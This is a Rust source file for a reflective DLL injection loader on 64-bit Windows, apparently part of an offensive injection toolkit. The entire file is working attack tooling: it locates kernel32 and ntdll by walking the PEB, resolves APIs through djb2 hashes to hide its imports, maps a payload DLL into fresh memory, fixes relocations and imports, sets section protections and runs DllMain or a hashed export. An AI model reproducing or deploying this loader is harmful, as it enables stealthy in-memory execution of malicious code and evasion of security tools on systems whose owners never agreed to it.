#![no_std]
#![no_main]
#![allow(non_snake_case)]
#![allow(non_camel_case_types)]

use core::{ffi::c_void, ptr::null_mut, slice::from_raw_parts, mem::{transmute, size_of}, arch::asm};
use windows_sys::{
    core::PCSTR,
    Win32::{
        Foundation::{BOOL, FARPROC, HANDLE, UNICODE_STRING, HMODULE, BOOLEAN},
        System::{
            Diagnostics::{Debug::{
                IMAGE_NT_HEADERS64, IMAGE_SCN_MEM_EXECUTE,
                IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE, IMAGE_SECTION_HEADER, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT,
            }},
            Memory::{
                MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_EXECUTE_READ,
                PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY, PAGE_PROTECTION_FLAGS,
                PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOPY, VIRTUAL_ALLOCATION_TYPE,
                VIRTUAL_FREE_TYPE,
            },
            SystemServices::{
                DLL_PROCESS_ATTACH, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_BASE_RELOCATION, IMAGE_REL_BASED_HIGHLOW, IMAGE_REL_BASED_DIR64, IMAGE_IMPORT_DESCRIPTOR, IMAGE_ORDINAL_FLAG64, IMAGE_IMPORT_BY_NAME,
            }, WindowsProgramming::{IMAGE_THUNK_DATA64, CLIENT_ID}, Kernel::{LIST_ENTRY, NT_TIB}, Threading::PEB,
        },
    },
};

//https://github.com/Trantect/win_driver_example/issues/4
#[export_name = "_fltused"]
static _FLTUSED: i32 = 0;

#[cfg(not(test))]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! { loop {} }

// Using no_std appears to expect _DllMainCRTStartup and _fltused instead of only DllMain
#[no_mangle]
#[allow(non_snake_case)]
pub unsafe extern "system" fn _DllMainCRTStartup(
    _module: HMODULE,
    _call_reason: u32,
    _reserved: *mut c_void,
) -> BOOL {
    1
}

/// Performs a Reflective DLL Injection
#[link_section = ".text"]
#[no_mangle]
pub unsafe extern "system" fn loader(payload_dll: *mut c_void, function_hash: u32, user_data: *mut c_void, user_data_len: u32, _shellcode_bin: *mut c_void, _flags: u32)
{
    let module_base = payload_dll as *mut u8;

    if module_base.is_null()
    {
        return;
    }

    let dos_header = module_base as *mut IMAGE_DOS_HEADER;
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    //
    // Step 1) Load required modules and exports by hash
    //

    // Hashes generated by hash calculator
    let KERNEL32_HASH: u32 = 0x6ddb9555;
    let NTDLL_HASH: u32 = 0x1edab0ed;
    let LOAD_LIBRARY_A_HASH: u32 = 0xb7072fdb;
    let GET_PROC_ADDRESS_HASH: u32 = 0xdecfc1bf;
    let VIRTUAL_ALLOC_HASH: u32 = 0x97bc257;
    let VIRTUAL_PROTECT_HASH: u32 = 0xe857500d;
    let FLUSH_INSTRUCTION_CACHE_HASH: u32 = 0xefb7bf9d;
    let VIRTUAL_FREE_HASH: u32 = 0xe144a60e;
    let EXIT_THREAD_HASH: u32 = 0xc165d757;

    let kernel32_base = get_loaded_module_by_hash(KERNEL32_HASH).unwrap();
    let ntdll_base = get_loaded_module_by_hash(NTDLL_HASH).unwrap();

    if kernel32_base.is_null() || ntdll_base.is_null() 
    {
        return;
    }

    // Create function pointers
    #[allow(non_camel_case_types)]
    type fnLoadLibraryA = unsafe extern "system" fn(lplibfilename: PCSTR) -> HMODULE;

    #[allow(non_camel_case_types)]
    type fnGetProcAddress = unsafe extern "system" fn(HMODULE: HMODULE, lpprocname: PCSTR) -> FARPROC;

    #[allow(non_camel_case_types)]
    type fnFlushInstructionCache = unsafe extern "system" fn(hprocess: HANDLE, lpbaseaddress: *const c_void, dwsize: usize) -> BOOL;

    #[allow(non_camel_case_types)]
    type fnVirtualAlloc = unsafe extern "system" fn(lpaddress: *const c_void, dwsize: usize, flallocationtype: VIRTUAL_ALLOCATION_TYPE, flprotect: PAGE_PROTECTION_FLAGS) -> *mut c_void;

    #[allow(non_camel_case_types)]
    type fnVirtualProtect = unsafe extern "system" fn(lpaddress: *const c_void, dwsize: usize, flnewprotect: PAGE_PROTECTION_FLAGS, lpfloldprotect: *mut PAGE_PROTECTION_FLAGS) -> BOOL;

    #[allow(non_camel_case_types)]
    type fnVirtualFree = unsafe extern "system" fn(lpaddress: *mut c_void, dwsize: usize, dwfreetype: VIRTUAL_FREE_TYPE) -> BOOL;

    #[allow(non_camel_case_types)]
    type fnExitThread = unsafe extern "system" fn(dwexitcode: u32) -> !;

    // Get exports
    let loadlib_addy = get_export_by_hash(kernel32_base, LOAD_LIBRARY_A_HASH).unwrap();
    let LoadLibraryA = transmute::<_, fnLoadLibraryA>(loadlib_addy);

    let getproc_addy = get_export_by_hash(kernel32_base, GET_PROC_ADDRESS_HASH).unwrap();
    let GetProcAddress = transmute::<_, fnGetProcAddress>(getproc_addy);

    let virtualalloc_addy = get_export_by_hash(kernel32_base, VIRTUAL_ALLOC_HASH).unwrap();
    let VirtualAlloc = transmute::<_, fnVirtualAlloc>(virtualalloc_addy);

    let virtualprotect_addy = get_export_by_hash(kernel32_base, VIRTUAL_PROTECT_HASH).unwrap();
    let VirtualProtect = transmute::<_, fnVirtualProtect>(virtualprotect_addy);

    let flushcache_addy = get_export_by_hash(kernel32_base, FLUSH_INSTRUCTION_CACHE_HASH).unwrap();
    let FlushInstructionCache = transmute::<_, fnFlushInstructionCache>(flushcache_addy);

    let virtualfree_addy = get_export_by_hash(kernel32_base, VIRTUAL_FREE_HASH).unwrap();
    let _VirtualFree = transmute::<_, fnVirtualFree>(virtualfree_addy);

    let exitthread_addy = get_export_by_hash(kernel32_base, EXIT_THREAD_HASH).unwrap();
    let _ExitThread = transmute::<_, fnExitThread>(exitthread_addy);

    if loadlib_addy == 0 || getproc_addy == 0 || virtualalloc_addy == 0 || virtualprotect_addy == 0 || flushcache_addy == 0 || virtualfree_addy == 0 || exitthread_addy == 0
    {
        return;
    }

    //
    // Step 2) Allocate memory and copy sections into the newly allocated memory (Note: DOS headers and NT headers are not copied)
    //

    let image_size = (*nt_headers).OptionalHeader.SizeOfImage as usize;
    let preferred_image_base_rva = (*nt_headers).OptionalHeader.ImageBase as *mut c_void;
    let mut new_module_base = VirtualAlloc(preferred_image_base_rva, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if new_module_base.is_null() 
    {
        new_module_base = VirtualAlloc(null_mut(), image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    }

    let section_header = (&(*nt_headers).OptionalHeader as *const _ as usize + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize) as *mut IMAGE_SECTION_HEADER;

    for i in 0..(*nt_headers).FileHeader.NumberOfSections 
    {
        let section_header_i = &*(section_header.add(i as usize));
        let destination = new_module_base.cast::<u8>().add(section_header_i.VirtualAddress as usize);
        let source = (module_base as usize + section_header_i.PointerToRawData as usize) as *const u8;
        let size = section_header_i.SizeOfRawData as usize;

        //core::ptr::copy_nonoverlapping(source, destination,size);
        let source_data = core::slice::from_raw_parts(source as *const u8, size);
        
        for x in 0..size {
            let src_data = source_data[x];
            let dest_data = destination.add(x);
            *dest_data = src_data;
        }
    }

    /* 
    // Copy headers into the target memory location (remember to stomp/erase DOS and NT headers later)
    for i in 0..(*nt_headers).OptionalHeader.SizeOfHeaders 
    {
        new_module_base.cast::<u8>().add(i as usize).write(module_base.add(i as usize).read());
    }*/

    // Everything from here will use the new_module_base memory region that was just allocated via VirtualAlloc

    //
    // Step 3) Process image relocations (rebase image)
    //

    let delta = new_module_base as isize - (*nt_headers).OptionalHeader.ImageBase as isize;

    let mut base_relocation = (new_module_base as usize + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].VirtualAddress as usize) as *mut IMAGE_BASE_RELOCATION;

    if base_relocation.is_null() 
    {
        return;
    }

    let base_relocation_end = base_relocation as usize + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].Size as usize;

    while (*base_relocation).VirtualAddress != 0u32 && (*base_relocation).VirtualAddress as usize <= base_relocation_end && (*base_relocation).SizeOfBlock != 0u32
    {
        let address = (new_module_base as usize + (*base_relocation).VirtualAddress as usize) as isize;
        let item = (base_relocation as usize + size_of::<IMAGE_BASE_RELOCATION>()) as *const u16;
        let count = ((*base_relocation).SizeOfBlock as usize - size_of::<IMAGE_BASE_RELOCATION>()) / size_of::<u16>() as usize;

        for i in 0..count 
        {
            let type_field = (item.offset(i as isize).read() >> 12) as u32;
            let offset = item.offset(i as isize).read() & 0xFFF;

            if type_field == IMAGE_REL_BASED_DIR64 || type_field == IMAGE_REL_BASED_HIGHLOW 
            {
                // Add the delta to the value of each address where the relocation needs to be performed
                *((address + offset as isize) as *mut isize) += delta;
            }
        }

        base_relocation = (base_relocation as usize + (*base_relocation).SizeOfBlock as usize) as *mut IMAGE_BASE_RELOCATION;
    }

    //
    // Step 4) Process image import table (resolve imports)
    //

    let mut import_directory = (new_module_base as usize + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress as usize) as *mut IMAGE_IMPORT_DESCRIPTOR;

    if import_directory.is_null()
    {
        return;
    }

    while (*import_directory).Name != 0x0 
    {
        let dll_name = (new_module_base as usize + (*import_directory).Name as usize) as *const i8;

        if dll_name.is_null() 
        {
            return;
        }

        let dll_handle = LoadLibraryA(dll_name as _);

        if dll_handle == 0 
        {
            return;
        }

        let mut original_thunk = if (new_module_base as usize + (*import_directory).Anonymous.OriginalFirstThunk as usize) != 0
        {
            let orig_thunk = (new_module_base as usize + (*import_directory).Anonymous.OriginalFirstThunk as usize) as *mut IMAGE_THUNK_DATA64;
            orig_thunk
        } 
        else 
        {
            let thunk = (new_module_base as usize + (*import_directory).FirstThunk as usize) as *mut IMAGE_THUNK_DATA64;
            thunk
        };

        let mut thunk = (new_module_base as usize + (*import_directory).FirstThunk as usize) as *mut IMAGE_THUNK_DATA64;

        while (*original_thunk).u1.Function != 0 
        {
            let snap_result = ((*original_thunk).u1.Ordinal) & IMAGE_ORDINAL_FLAG64 != 0;

            if snap_result 
            {
                let fn_ordinal = ((*original_thunk).u1.Ordinal & 0xffff) as *const u8;
                (*thunk).u1.Function = GetProcAddress(dll_handle, fn_ordinal).unwrap() as _;
            } 
            else 
            {
                let thunk_data = (new_module_base as usize + (*original_thunk).u1.AddressOfData as usize) as *mut IMAGE_IMPORT_BY_NAME;
                let fn_name = (*thunk_data).Name.as_ptr();
                (*thunk).u1.Function = GetProcAddress(dll_handle, fn_name).unwrap() as _;
            }

            thunk = thunk.add(1);
            original_thunk = original_thunk.add(1);
        }

        import_directory = (import_directory as usize + size_of::<IMAGE_IMPORT_DESCRIPTOR>() as usize) as _;
    }

    //
    // Step 5) Set protection for each section
    //

    let section_header = (&(*nt_headers).OptionalHeader as *const _ as usize + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize) as *mut IMAGE_SECTION_HEADER;

    for i in 0..(*nt_headers).FileHeader.NumberOfSections 
    {
        let mut _protection = 0;
        let mut _old_protection = 0;

        // get a reference to the current _IMAGE_SECTION_HEADER
        let section_header_i = unsafe { &*(section_header.add(i as usize)) };
        // get the pointer to current section header's virtual address
        let destination = new_module_base.cast::<u8>().add(section_header_i.VirtualAddress as usize);
        // get the size of the current section header's data
        let size = section_header_i.SizeOfRawData as usize;

        if section_header_i.Characteristics & IMAGE_SCN_MEM_WRITE != 0 
        {
            _protection = PAGE_WRITECOPY;
        }

        if section_header_i.Characteristics & IMAGE_SCN_MEM_READ != 0 
        {
            _protection = PAGE_READONLY;
        }

        if section_header_i.Characteristics & IMAGE_SCN_MEM_WRITE != 0 && section_header_i.Characteristics & IMAGE_SCN_MEM_READ != 0
        {
            _protection = PAGE_READWRITE;
        }

        if section_header_i.Characteristics & IMAGE_SCN_MEM_EXECUTE != 0 
        {
            _protection = PAGE_EXECUTE;
        }

        if section_header_i.Characteristics & IMAGE_SCN_MEM_EXECUTE != 0 && section_header_i.Characteristics & IMAGE_SCN_MEM_WRITE != 0
        {
            _protection = PAGE_EXECUTE_WRITECOPY;
        }

        if section_header_i.Characteristics & IMAGE_SCN_MEM_EXECUTE != 0 && section_header_i.Characteristics & IMAGE_SCN_MEM_READ != 0
        {
            _protection = PAGE_EXECUTE_READ;
        }

        if section_header_i.Characteristics & IMAGE_SCN_MEM_EXECUTE != 0 && section_header_i.Characteristics & IMAGE_SCN_MEM_WRITE != 0 && section_header_i.Characteristics & IMAGE_SCN_MEM_READ != 0
        {
            _protection = PAGE_EXECUTE_READWRITE;
        }

        // Change memory protection for each section
        VirtualProtect(destination as _, size, _protection, &mut _old_protection);
    }

    // We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
    FlushInstructionCache(-1 as _, null_mut(), 0);

    //
    // Step 6) Execute DllMain or user function depending on the flag
    //
    let entry_point = new_module_base as usize + (*nt_headers).OptionalHeader.AddressOfEntryPoint as usize;    


    #[allow(non_camel_case_types)]
    type fnDllMain = unsafe extern "system" fn(module: HMODULE, call_reason: u32, reserved: *mut c_void) -> BOOL;

    #[allow(non_snake_case)]
    let DllMain = transmute::<_, fnDllMain>(entry_point);

    if _flags == 0 {
        // The module_base (old_module_base) base can be freed in DllMain, which is allocated by the user injector (BOYI)
        DllMain(new_module_base as _, DLL_PROCESS_ATTACH, module_base as _);
    } else {
        #[allow(non_camel_case_types)]
        type fnUserFunction = unsafe extern "system" fn(user_data: *mut c_void, user_data_length: u32) -> BOOL;
        
        let user_function_entry_point = get_export_by_hash(new_module_base as _, function_hash).unwrap();

        #[allow(non_snake_case)]
        let UserFunction = transmute::<_, fnUserFunction>(user_function_entry_point);

        // Call user function passing the user data and user data length as parameters
        UserFunction(user_data, user_data_len);
    }
}

#[link_section = ".text"]
/// Gets a pointer to IMAGE_NT_HEADERS64 x86_64
pub unsafe fn get_nt_headers(module_base: *mut u8) -> Option<*mut IMAGE_NT_HEADERS64> 
{
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE 
    {
        return None;
    }

    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    if (*nt_headers).Signature != IMAGE_NT_SIGNATURE as _ 
    {
        return None;
    }

    return Some(nt_headers);
}

#[link_section = ".text"]
/// Get a pointer to the Thread Environment Block (TEB)
pub unsafe fn get_teb() -> *mut TEB 
{
    let teb: *mut TEB;
    asm!("mov {teb}, gs:[0x30]", teb = out(reg) teb);
    teb
}

#[link_section = ".text"]
/// Get a pointer to the Process Environment Block (PEB)
pub unsafe fn get_peb() -> *mut PEB 
{
    let teb = get_teb();
    let peb = (*teb).ProcessEnvironmentBlock;
    peb
}

#[link_section = ".text"]
/// Get loaded module by hash
pub unsafe fn get_loaded_module_by_hash(module_hash: u32) -> Option<*mut u8> 
{
    let peb = get_peb();
    let peb_ldr_data_ptr = (*peb).Ldr as *mut PEB_LDR_DATA;
    let mut module_list = (*peb_ldr_data_ptr).InLoadOrderModuleList.Flink as *mut LDR_DATA_TABLE_ENTRY;

    while !(*module_list).DllBase.is_null() 
    {
        let dll_buffer_ptr = (*module_list).BaseDllName.Buffer;
        let dll_length = (*module_list).BaseDllName.Length as usize;
        let dll_name_slice = from_raw_parts(dll_buffer_ptr as *const u8, dll_length);

        if module_hash == dbj2_hash(dll_name_slice) 
        {
            return Some((*module_list).DllBase as _);
        }

        module_list = (*module_list).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
    }

    return None;
}

#[link_section = ".text"]
/// Get the address of an export by hash
pub unsafe fn get_export_by_hash(module_base: *mut u8, export_name_hash: u32) -> Option<usize>
{
    let nt_headers = get_nt_headers(module_base)?;
    let export_directory = (module_base as usize + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress as usize) as *mut IMAGE_EXPORT_DIRECTORY;
    let names = from_raw_parts((module_base as usize + (*export_directory).AddressOfNames as usize) as *const u32, (*export_directory).NumberOfNames as _);
    let functions = from_raw_parts((module_base as usize + (*export_directory).AddressOfFunctions as usize) as *const u32, (*export_directory).NumberOfFunctions as _,);
    let ordinals = from_raw_parts((module_base as usize + (*export_directory).AddressOfNameOrdinals as usize) as *const u16, (*export_directory).NumberOfNames as _);

    for i in 0..(*export_directory).NumberOfNames 
    {
        let name_addr = (module_base as usize + names[i as usize] as usize) as *const i8;
        let name_len = get_cstr_len(name_addr as _);
        let name_slice: &[u8] = from_raw_parts(name_addr as _, name_len);

        if export_name_hash == dbj2_hash(name_slice) 
        {
            let ordinal = ordinals[i as usize] as usize;
            return Some(module_base as usize + functions[ordinal] as usize);
        }
    }

    return None;
}

#[link_section = ".text"]
/// Generate a unique hash
pub fn dbj2_hash(buffer: &[u8]) -> u32 
{
    let mut hsh: u32 = 5381;
    let mut iter: usize = 0;
    let mut cur: u8;

    while iter < buffer.len() 
    {
        cur = buffer[iter];

        if cur == 0 
        {
            iter += 1;
            continue;
        }

        if cur >= ('a' as u8) 
        {
            cur -= 0x20;
        }

        hsh = ((hsh << 5).wrapping_add(hsh)) + cur as u32;
        iter += 1;
    }

    return hsh;
}

#[link_section = ".text"]
/// Get the length of a C String
pub unsafe fn get_cstr_len(pointer: *const char) -> usize 
{
    let mut tmp: u64 = pointer as u64;

    while *(tmp as *const u8) != 0 
    {
        tmp += 1;
    }

    (tmp - pointer as u64) as _
}

#[link_section = ".text"]
#[allow(dead_code)]
/// Checks to see if the architecture x86 or x86_64
pub fn is_wow64() -> bool 
{
    // A usize is 4 bytes on 32 bit and 8 bytes on 64 bit
    if size_of::<usize>() == 4 
    {
        return false;
    }

    return true;
}

#[link_section = ".text"]
/// Read memory from a location specified by an offset relative to the beginning of the GS segment.
pub unsafe fn __readgsqword(offset: u64) -> u64 
{
    let output: u64;
    asm!("mov {}, gs:[{}]", out(reg) output, in(reg) offset);
    output
}

// Types because Microsoft *sigh*
#[repr(C)]
pub union LDR_DATA_TABLE_ENTRY_u1 {
    pub InInitializationOrderLinks: LIST_ENTRY,
    pub InProgressLinks: LIST_ENTRY,
}

pub type PLDR_INIT_ROUTINE = Option<unsafe extern "system" fn(DllHandle: *mut c_void, Reason: u32, Context: *mut c_void) -> BOOLEAN>;

#[repr(C)]
pub struct LDR_DATA_TABLE_ENTRY 
{
    pub InLoadOrderLinks: LIST_ENTRY,
    pub InMemoryOrderLinks: LIST_ENTRY,
    pub u1: LDR_DATA_TABLE_ENTRY_u1,
    pub DllBase: *mut c_void,
    pub EntryPoint: PLDR_INIT_ROUTINE,
    pub SizeOfImage: u32,
    pub FullDllName: UNICODE_STRING,
    pub BaseDllName: UNICODE_STRING,
}

#[repr(C)]
pub struct TEB 
{
    pub NtTib: NT_TIB,
    pub EnvironmentPointer: *mut c_void,
    pub ClientId: CLIENT_ID,
    pub ActiveRpcHandle: *mut c_void,
    pub ThreadLocalStoragePointer: *mut c_void,
    pub ProcessEnvironmentBlock: *mut PEB,
}

#[repr(C)]
pub struct PEB_LDR_DATA {
    pub Length: u32,
    pub Initialized: BOOLEAN,
    pub SsHandle: HANDLE,
    pub InLoadOrderModuleList: LIST_ENTRY,
    pub InMemoryOrderModuleList: LIST_ENTRY,
    pub InInitializationOrderModuleList: LIST_ENTRY,
    pub EntryInProgress: *mut c_void,
    pub ShutdownInProgress: BOOLEAN,
    pub ShutdownThreadId: HANDLE,
}